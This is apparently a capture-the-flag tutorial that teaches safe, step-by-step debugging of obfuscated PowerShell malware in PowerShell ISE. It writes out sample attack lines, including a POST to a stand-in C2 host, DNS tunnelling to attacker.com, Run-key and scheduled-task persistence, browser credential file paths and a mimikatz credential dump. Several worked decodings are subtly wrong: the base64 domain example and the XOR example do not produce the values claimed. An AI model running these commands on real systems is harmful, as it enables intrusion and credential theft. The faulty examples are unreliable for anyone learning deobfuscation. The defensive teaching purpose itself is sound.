# PowerShell Malware Analysis with Debugging

## Introduction: Why Debug Malware?

**Static analysis** (reading code, decoding strings manually) only shows you **what** the malware contains.

**Dynamic analysis with debugging** shows you:
- **How** the malware works step-by-step
- **When** variables get decoded
- **What** the actual execution flow looks like
- **Where** malicious behavior occurs

### Real-World Use Case:

When malware analysts receive obfuscated PowerShell, they:
1. Load it in a debugger
2. Set breakpoints on suspicious variables
3. Step through execution line-by-line
4. Watch variables decode in the debugger's variable pane
5. Never let dangerous commands actually execute

---

## PowerShell ISE: The Built-In Debugger

**PowerShell ISE** (Integrated Scripting Environment) is Windows' built-in PowerShell development tool with a **powerful debugger**.

### What PowerShell ISE Provides:

1. **Script Pane** - View and edit PowerShell code
2. **Console Pane** - Interactive PowerShell console
3. **Variables Pane** - Live view of all variables and their values
4. **Debugger Controls** - Step through code, set breakpoints, inspect state

### Key Debugger Features:

| Feature | Hotkey | Description |
|---------|--------|-------------|
| **Set Breakpoint** | F9 | Pause execution at a specific line |
| **Run/Continue** | F5 | Run script until next breakpoint |
| **Step Over** | F10 | Execute current line, move to next |
| **Step Into** | F11 | Enter functions/calls |
| **Step Out** | Shift+F11 | Exit current function |
| **Stop Debugging** | Shift+F5 | Stop execution |

---

## Safe Malware Debugging: The Methodology

###  ⚠️ CRITICAL SAFETY RULES:

1. **NEVER run malware with F5 (Run)** - It will execute all dangerous commands
2. **ALWAYS use F10 (Step Over)** - Execute line-by-line, you stay in control
3. **Set breakpoints BEFORE dangerous lines** - Stop before network calls, file writes, registry changes
4. **Disconnect from network** (optional but recommended) - Malware can't beacon out if offline
5. **Use a VM or test machine** (best practice) - Isolate from production systems

### The Safe Debugging Workflow:

```
1. Open script in PowerShell ISE
2. Identify dangerous commands (Invoke-WebRequest, Set-ItemProperty, Copy-Item)
3. Set breakpoints BEFORE those lines
4. Use F10 (Step Over) to execute safely
5. Watch Variables pane to see obfuscated variables decode
6. STOP before dangerous commands execute (or comment them out first)
```

---

## Understanding PowerShell Obfuscation Techniques

Malware authors obfuscate PowerShell to:
- Evade antivirus signatures
- Hide C2 domains and IPs
- Confuse human analysts
- Bypass security monitoring

### Common Obfuscation Techniques:

#### 1. Base64 Encoding
```powershell
$encoded = 'SGVsbG8gV29ybGQ='  # "Hello World" in base64
$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
# $decoded = "Hello World"
```

#### 2. String Reversal
```powershell
$reversed = 'dlroW olleH'  # "Hello World" backwards
$normal_arr = $reversed.ToCharArray()
[array]::Reverse($normal_arr)
$normal = -join $normal_arr
# $normal = "Hello World"
```

#### 3. Character Replacement
```powershell
$obfuscated = "H3ll0 W0rld"  # 'e'→'3', 'o'→'0'
$normal = $obfuscated.Replace('3','e').Replace('0','o')
# $normal = "Hello World"
```

#### 4. XOR Encoding
```powershell
$encoded = @(46, 67, 70, 70, 79)  # ASCII values XORed with 42
$decoded = -join ($encoded | ForEach-Object { [char]($_ -bxor 42) })
# $decoded = "Hello"
```

#### 5. String Concatenation
```powershell
$part1 = "Hel"
$part2 = "lo "
$part3 = "World"
$full = $part1 + $part2 + $part3
# $full = "Hello World"
```

---

## Debugging Obfuscated PowerShell: Step-by-Step

### Example: Debugging a Base64 Obfuscated Domain

**Malware Sample:**
```powershell
# Line 1: Base64 encoded domain (reversed)
$x1b9 = 'bW9jLmV2aWwtQzItbGl2'

# Line 2: Decode base64
$q5w = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x1b9))

# Line 3: Reverse the string
$k9m_arr = $q5w.ToCharArray()
[array]::Reverse($k9m_arr)
$k9m = -join $k9m_arr

# Line 4: Use the decoded domain (DANGEROUS!)
Invoke-WebRequest -Uri "http://$k9m" -Method POST
```

### Debugging This Sample:

**Step 1: Open in PowerShell ISE**
- File → Open → Select the script

**Step 2: Set Breakpoint on Line 3**
- Click on Line 3 (the line with `$k9m_arr`)
- Press F9 (or click left margin to add red dot)

**Step 3: Start Debugging with F10 (Step Over)**
- Press F10 (NOT F5!)
- This executes Line 1: `$x1b9` is now set

**Step 4: Check Variables Pane**
- Look at the Variables pane (View → Show Variables if hidden)
- You'll see: `$x1b9 = 'bW9jLmU2aWwtQzItbGl2'`
- Still obfuscated, but now stored

**Step 5: Continue Stepping (F10)**
- Press F10 again → Line 2 executes
- Check Variables pane: `$q5w = 'liv-2C-live.com'` (decoded but backwards)

**Step 6: Continue Stepping (F10)**
- Press F10 three more times → Lines 3-5 execute
- Check Variables pane: `$k9m = 'evil-C2.com'` (now reversed!)

**Step 7: STOP Before Line 4!**
- Press Shift+F5 to stop debugging
- You've extracted the C2 domain (`evil-C2.com`) WITHOUT actually connecting to it!

---

## Debugging Multi-Layer Obfuscation

Real malware often has **multiple encoding layers**:

```
Base64 → Reverse → XOR → Character Replace → Final Value
```

### Strategy:

1. **Set breakpoints at each variable assignment**
2. **Step through layer by layer**
3. **Watch each decode step in Variables pane**
4. **Document each layer's output**

### Example Debugging Session:

```
Line 10: $layer1 = 'YmFzZTY0X2RhdGE='
[F10] → Variables: $layer1 = 'YmFzZTY0X2RhdGE='

Line 11: $layer2 = [Convert]::FromBase64String($layer1)
[F10] → Variables: $layer2 = 'base64_data'

Line 12: $layer3 = $layer2.Replace('_','-')
[F10] → Variables: $layer3 = 'base64-data'

Line 13: $final = Reverse-String $layer3
[F10] → Variables: $final = 'atad-46esab'
```

You can see EXACTLY how each layer decodes!

---

## Finding the Flag with Debugging

In Day 5's challenge, the flag is **split across multiple obfuscated variables**:

```powershell
$fp1 = (Decode using XOR)
$fp2 = (Decode using Base64 + Reverse)
$fp3 = (Decode using Character Replace + Reverse)
$fp4 = (Decode using Base64)

# Final flag assembly:
$flag = $fp1 + $fp2 + $fp3 + $fp4
# Result: FROST{...}
```

### Debugging Strategy:

1. **Set breakpoints after each `$fpX` assignment**
2. **Step through with F10**
3. **Watch Variables pane as each flag piece decodes**
4. **Manually assemble the flag from the four pieces**

---

## Identifying Malicious Behavior (IOCs)

While debugging, look for **Indicators of Compromise (IOCs)**:

### Network IOCs:
```powershell
# C2 communication
Invoke-WebRequest -Uri $c2_domain
Invoke-RestMethod -Uri $exfil_server

# DNS tunneling
Resolve-DnsName -Name $encoded_data.attacker.com
```

**What to extract:**
- C2 domain names
- IP addresses
- Ports
- URLs/endpoints

### Persistence IOCs:
```powershell
# Registry Run keys
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Scheduled tasks
schtasks /create /tn "UpdateTask" /tr "malware.exe"

# Startup folder
Copy-Item script.ps1 -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

**What to extract:**
- Registry paths and key names
- Scheduled task names
- File paths

### Credential Theft IOCs:
```powershell
# Browser credential databases
$chrome_db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$firefox_db = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"

# Windows credentials
mimikatz.exe sekurlsa::logonpasswords
```

**What to extract:**
- Target file paths
- Credential dump tools
- Exfiltration methods

---

## MITRE ATT&CK Mapping

Debugging reveals which MITRE techniques the malware uses:

| Malware Behavior | MITRE Technique |
|------------------|-----------------|
| Base64 obfuscation | T1027.010 - Obfuscation: Command Obfuscation |
| Registry Run key | T1547.001 - Boot/Logon: Registry Run Keys |
| Invoke-WebRequest to C2 | T1071.001 - Application Layer: Web Protocols |
| Chrome credential theft | T1555.003 - Credentials from Web Browsers |
| PowerShell execution | T1059.001 - Command/Script: PowerShell |

---

## Practice Exercise

Try debugging this simple obfuscated script:

```powershell
# Obfuscated Hello World
$a = 'SGVsbG8='
$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a))
$c = ' World'
$result = $b + $c
Write-Output $result
```

**Practice Steps:**
1. Save this as `practice.ps1`
2. Open in PowerShell ISE
3. Set breakpoint on line with `$result =`
4. Press F10 four times
5. Watch Variables pane decode each step
6. Final output: "Hello World"

---

## Advanced Tips

### Tip 1: Use Conditional Breakpoints
Right-click a breakpoint → Set conditions
```powershell
# Only break if variable contains specific value
if ($domain -like '*evil*') { break }
```

### Tip 2: Script Pane Highlighting
- Highlight suspicious commands
- Use Ctrl+F to find all instances of dangerous functions

### Tip 3: Export Variables
```powershell
# In console pane while debugging:
$all_vars = Get-Variable | Out-String
$all_vars | Out-File decoded_variables.txt
```

### Tip 4: Comment Out Dangerous Code
Before debugging, comment out:
```powershell
# Invoke-WebRequest -Uri $c2   # DISABLED FOR ANALYSIS
# Set-ItemProperty -Path $reg  # DISABLED FOR ANALYSIS
```

---

## Summary: Why Debugging > Static Analysis

| Static Analysis | Dynamic Debugging |
|-----------------|-------------------|
| Read code manually | Watch execution live |
| Decode strings by hand | Variables decode automatically |
| Guess execution flow | See actual flow |
| Miss complex logic | Step through everything |
| Time-consuming | Faster insights |

**Debugging teaches you:**
- ✅ How malware actually executes
- ✅ Real-world security analysis skills
- ✅ PowerShell debugging (valuable for legit scripting too)
- ✅ How to safely analyze dangerous code

---

## Next: The Challenge

Now that you understand PowerShell debugging, you'll use PowerShell ISE to:
1. Load Jack Frost's obfuscated malware
2. Set strategic breakpoints
3. Step through the deobfuscation
4. Extract all four flag pieces
5. Identify C2 infrastructure, persistence mechanisms, and exfiltration targets

**Remember:** F10 (Step Over) is your friend. NEVER just press F5 and run malware!

Ready to debug? Let's analyze Jack Frost's PowerShell payload!
